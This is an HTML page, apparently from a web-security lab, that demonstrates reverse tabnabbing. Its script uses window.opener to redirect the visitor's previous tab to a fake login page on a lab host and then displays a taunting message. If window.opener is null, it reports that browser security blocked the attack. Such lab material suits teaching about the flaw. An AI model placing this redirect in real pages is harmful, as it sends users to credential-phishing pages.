<!DOCTYPE html>
<html>
<head>
    <title>Partner Site</title>
    <script src="https://tailwindcss.eitebar.ir/tailwind-play.js"></script>
</head>
<body class="bg-gray-900 text-white flex items-center justify-center h-screen text-center">
    <div>
        <script>
            if (window.opener) {
                window.opener.location = 'https://hackerapp.eitebar.ir/fake-login';
                document.write('<h1 class="text-4xl text-green-500 font-bold">Thanks for visiting!</h1><p class="mt-4 text-xl">Look at your previous tab... 😈</p>');
            } else {
                document.write('<h1 class="text-4xl text-blue-400 font-bold">Browser Security Blocked the Attack!</h1><p class="mt-4 text-xl">window.opener is null 🛡️</p>');
            }
        </script>
    </div>
    <a href="https://webapp.kr-rezvan.ir/labs" style="position: fixed; bottom: 20px; right: 20px; background-color: #3b82f6; color: white; padding: 10px 20px; border-radius: 50px; font-family: sans-serif; text-decoration: none; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1); z-index: 9999; transition: all 0.3s;" onmouseover="this.style.backgroundColor='#2563eb'" onmouseout="this.style.backgroundColor='#3b82f6'">
        🏠 Back to Lab Directory
    </a>
</body>
</html>